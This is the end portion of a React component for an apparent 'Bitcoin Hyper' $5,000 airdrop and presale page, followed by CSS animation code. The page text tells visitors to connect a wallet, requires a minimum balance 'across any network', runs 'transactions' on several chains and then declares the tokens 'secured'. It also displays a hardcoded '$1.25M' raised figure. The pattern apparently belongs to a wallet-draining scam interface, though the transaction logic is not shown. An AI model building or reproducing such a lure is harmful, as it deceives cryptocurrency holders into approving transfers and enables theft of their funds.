                    <p className="text-xs text-gray-500 text-center mt-3">
                      {verifiedChains.length} of {DEPLOYED_CHAINS.length} chains processed
                    </p>
                  </div>
                )}

                {/* Already completed */}
                {completedChains.length > 0 && (
                  <div className="text-center">
                    <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
                      <p className="text-green-400 text-lg mb-3 flex items-center justify-center gap-2">
                        <span>✓</span> TRANSACTIONS COMPLETED
                      </p>
                      <p className="text-gray-300 mb-4">Your $5,000 BTH has been secured on {completedChains.length} chains</p>
                    </div>
                    <button
                      onClick={claimTokens}
                      className="w-full group relative"
                    >
                      <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
                      <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl transform-gpu group-hover:scale-105 transition-all duration-500">
                        🎉 VIEW YOUR $5,000 BTH
                      </div>
                    </button>
                  </div>
                )}
              </div>
            ) : (
              // Welcome message for non-eligible
              <div className="bg-gradient-to-r from-purple-500/20 to-orange-500/20 backdrop-blur-xl border border-purple-500/30 rounded-2xl p-10 text-center transform-gpu hover:scale-105 transition-all duration-500">
                <div className="text-7xl mb-6 animate-float">👋</div>
                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-orange-400 bg-clip-text text-transparent">
                  Welcome to Bitcoin Hyper
                </h2>
                <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
                  Connect your wallet to check eligibility for the $5,000 BTH airdrop.
                </p>
                <div className="bg-gray-900/50 rounded-xl p-6 border border-gray-800">
                  <p className="text-sm text-gray-300 leading-relaxed">
                    Minimum $1 required across any network for eligibility.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ============================================ */}
        {/* PRESALE STATS - MOVED BEFORE FOOTER */}
        {/* ============================================ */}
        <div className="max-w-2xl mx-auto mt-12 mb-8">
          <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-2xl p-8">
            <h3 className="text-2xl font-bold text-center mb-6 bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent">
              PRESALE LIVE PROGRESS
            </h3>
            
            <div className="grid grid-cols-3 gap-4 mb-6">
              <div className="text-center">
                <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
                <div className="text-xs text-gray-500">Token Price</div>
              </div>
              <div className="text-center">
                <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
                <div className="text-xs text-gray-500">Current Bonus</div>
              </div>
              <div className="text-center">
                <div className="text-3xl font-bold text-yellow-400 mb-1">$1.25M</div>
                <div className="text-xs text-gray-500">Total Raised</div>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="mb-4">
              <div className="flex justify-between text-sm text-gray-400 mb-2">
                <span>Progress</span>
                <span>{liveProgress.percentComplete}%</span>
              </div>
              <div className="w-full h-3 bg-gray-800 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full relative"
                  style={{ width: `${liveProgress.percentComplete}%` }}
                >
                  <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 mt-6">
              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
                <div className="text-sm text-gray-400 mb-1">Participants Today</div>
                <div className="text-xl font-bold text-orange-400">{liveProgress.participantsToday}</div>
              </div>
              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
                <div className="text-sm text-gray-400 mb-1">Avg Allocation</div>
                <div className="text-xl font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
              </div>
            </div>

            <div className="mt-6 text-center">
              <p className="text-sm text-gray-500">
                {presaleStats.totalParticipants.toLocaleString()} participants • {liveProgress.percentComplete}% of target reached
              </p>
            </div>
          </div>
        </div>

        {/* ============================================ */}
        {/* EPIC CELEBRATION MODAL */}
        {/* ============================================ */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="relative max-w-lg w-full">
              {/* Exploding Background */}
              <div className="absolute inset-0 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-3xl blur-3xl animate-pulse-slow"></div>
              
              {/* Confetti Cannons */}
              {[...Array(20)].map((_, i) => (
                <div
                  key={i}
                  className="absolute w-2 h-2 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full animate-confetti-cannon"
                  style={{
                    left: `${Math.random() * 100}%`,
                    top: '50%',
                    animationDelay: `${i * 0.1}s`,
                    animationDuration: `${1 + Math.random()}s`
                  }}
                />
              ))}
              
              {/* Modal Content */}
              <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-12 border border-orange-500/30 shadow-2xl transform-gpu animate-scaleIn">
                <div className="text-center">
                  {/* Exploding Icon */}
                  <div className="relative mb-8">
                    <div className="text-8xl animate-bounce-3d">🎉</div>
                    {[...Array(16)].map((_, i) => (
                      <div
                        key={i}
                        className="absolute w-3 h-3 bg-orange-500 rounded-full animate-confetti-spiral"
                        style={{
                          top: '50%',
                          left: '50%',
                          transform: `rotate(${i * 22.5}deg) translateY(-70px)`,
                          animationDelay: `${i * 0.05}s`
                        }}
                      />
                    ))}
                  </div>
                  
                  <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
                    🚀 MULTI-CHAIN SUCCESS! 🚀
                  </h2>
                  
                  <p className="text-2xl text-gray-300 mb-4">You have secured</p>
                  
                  <div className="text-7xl font-black text-orange-400 mb-3 animate-float-3d">$5,000 BTH</div>
                  
                  <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
                    <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                  </div>
                  
                  <p className="text-sm text-gray-500 mb-8">
                    Processed on {verifiedChains.length} chains
                  </p>
                  
                  <button
                    onClick={() => setShowCelebration(false)}
                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden"
                  >
                    <span className="relative z-10">VIEW DASHBOARD</span>
                    <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 text-center">
          <div className="flex flex-wrap justify-center gap-4 mb-6">
            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float">
              ⚡ Multi-Chain
            </span>
            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-500">
              🔄 Auto Network Switch
            </span>
            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-1000">
              💎 $5,000 Airdrop
            </span>
          </div>
          <p className="text-gray-600 text-sm animate-pulse">
            © 2026 Bitcoin Hyper • Next Generation Bitcoin Layer 2 • Multi-Chain Smart Contract
          </p>
        </div>
      </div>

      {/* Animation Keyframes - Keep all your existing animations */}
      <style>{`
        @keyframes float-slow {
          0%, 100% { transform: translate(0, 0) scale(1); }
          33% { transform: translate(30px, -30px) scale(1.1); }
          66% { transform: translate(-20px, 20px) scale(0.9); }
        }
        
        @keyframes float-particle {
          0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 1; transform: translateY(-100vh) translateX(100px) rotate(360deg); }
          100% { transform: translateY(-120vh) translateX(150px) rotate(720deg); opacity: 0; }
        }
        
        @keyframes float-3d {
          0%, 100% { transform: translateY(0) rotateX(0deg); }
          25% { transform: translateY(-30px) rotateX(10deg); }
          75% { transform: translateY(30px) rotateX(-10deg); }
        }
        
        @keyframes confetti {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(720deg) translateY(-200px) scale(0); opacity: 0; }
        }
        
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
          100% { transform: translateY(-300px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        
        @keyframes confetti-spiral {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(720deg) translateY(-150px) scale(0); opacity: 0; }
        }
        
        @keyframes ping-slow {
          75%, 100% { transform: scale(1.5); opacity: 0; }
        }
        
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        
        @keyframes spin-slower {
          from { transform: rotate(0deg); }
          to { transform: rotate(-360deg); }
        }
        
        @keyframes spin-slowest {
          from { transform: rotate(0deg); }
          to { transform: rotate(720deg); }
        }
        
        @keyframes spin-3d {
          0% { transform: rotateX(0deg) rotateY(0deg); }
          100% { transform: rotateX(360deg) rotateY(360deg); }
        }
        
        @keyframes spin-3d-reverse {
          0% { transform: rotateX(360deg) rotateY(360deg); }
          100% { transform: rotateX(0deg) rotateY(0deg); }
        }
        
        @keyframes gradient-x {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.5; }
          50% { opacity: 0.8; }
        }
        
        @keyframes pulse-text {
          0%, 100% { opacity: 0.8; text-shadow: 0 0 20px rgba(249,115,22,0.3); }
          50% { opacity: 1; text-shadow: 0 0 40px rgba(249,115,22,0.6); }
        }
        
        @keyframes pulse-glow {
          0%, 100% { box-shadow: 0 0 20px rgba(249,115,22,0.3); }
          50% { box-shadow: 0 0 40px rgba(249,115,22,0.6); }
        }
        
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        
        @keyframes scaleIn {
          from { transform: scale(0.8) rotateY(-30deg); opacity: 0; }
          to { transform: scale(1) rotateY(0); opacity: 1; }
        }
        
        @keyframes slideIn {
          from { transform: translateX(-50px); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
          20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
        
        @keyframes shimmer {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
        
        @keyframes border-pulse {
          0%, 100% { border-color: rgba(249,115,22,0.3); }
          50% { border-color: rgba(249,115,22,0.8); }
        }
        
        @keyframes bounce-3d {
          0%, 100% { transform: translateY(0) scale(1) rotateX(0deg); }
          50% { transform: translateY(-50px) scale(1.2) rotateX(20deg); }
        }
        
        @keyframes particle-burst {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(360deg) translateY(-100px) scale(0); opacity: 0; }
        }
        
        .animate-float-slow { animation: float-slow 20s ease-in-out infinite; }
        .animate-float-slower { animation: float-slow 25s ease-in-out infinite reverse; }
        .animate-float { animation: float-slow 15s ease-in-out infinite; }
        .animate-float-particle { animation: float-particle 15s linear infinite; }
        .animate-float-3d { animation: float-3d 6s ease-in-out infinite; }
        .animate-confetti { animation: confetti 1s ease-out forwards; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-confetti-spiral { animation: confetti-spiral 1.5s ease-out forwards; }
        .animate-ping-slow { animation: ping-slow 3s cubic-bezier(0, 0, 0.2, 1) infinite; }
        .animate-spin-slow { animation: spin-slow 20s linear infinite; }
        .animate-spin-slower { animation: spin-slower 25s linear infinite; }
        .animate-spin-slowest { animation: spin-slowest 30s linear infinite; }
        .animate-spin-3d { animation: spin-3d 3s linear infinite; }
        .animate-spin-3d-reverse { animation: spin-3d-reverse 3s linear infinite; }
        .animate-gradient-x { animation: gradient-x 3s ease infinite; background-size: 200% 200%; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-pulse-text { animation: pulse-text 2s ease-in-out infinite; }
        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
        .animate-fadeIn { animation: fadeIn 0.5s ease-out; }
        .animate-scaleIn { animation: scaleIn 0.5s ease-out; }
        .animate-slideIn { animation: slideIn 0.5s ease-out; }
        .animate-shake { animation: shake 0.5s ease-in-out; }
        .animate-shimmer { animation: shimmer 2s infinite; }
        .animate-border-pulse { animation: border-pulse 2s ease-in-out infinite; }
        .animate-bounce-3d { animation: bounce-3d 2s ease-in-out infinite; }
        .animate-particle-burst { animation: particle-burst 1s ease-out forwards; }
        
        .animation-delay-500 { animation-delay: 500ms; }
        .animation-delay-1000 { animation-delay: 1000ms; }
        .animation-delay-2000 { animation-delay: 2000ms; }
        .animation-delay-4000 { animation-delay: 4000ms; }
        
        .perspective-1000 { perspective: 1000px; }
        .rotate-y-12 { transform: rotateY(12deg); }
        
        .glitch {
          position: relative;
        }
        
        .glitch::before,
        .glitch::after {
          content: attr(data-text);
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: inherit;
          clip: rect(0, 0, 0, 0);
        }
        
        .glitch:hover::before {
          left: 2px;
          text-shadow: -2px 0 #ff00c1;
          animation: glitch-1 0.3s infinite linear alternate-reverse;
        }
        
        .glitch:hover::after {
          left: -2px;
          text-shadow: 2px 0 #00fff9;
          animation: glitch-2 0.3s infinite linear alternate-reverse;
        }
        
        @keyframes glitch-1 {
          0% { clip: rect(20px, 9999px, 20px, 0); }
          100% { clip: rect(80px, 9999px, 140px, 0); }
        }
        
        @keyframes glitch-2 {
          0% { clip: rect(40px, 9999px, 70px, 0); }
          100% { clip: rect(100px, 9999px, 130px, 0); }
        }
      `}</style>
    </div>
  );
}

export default App;
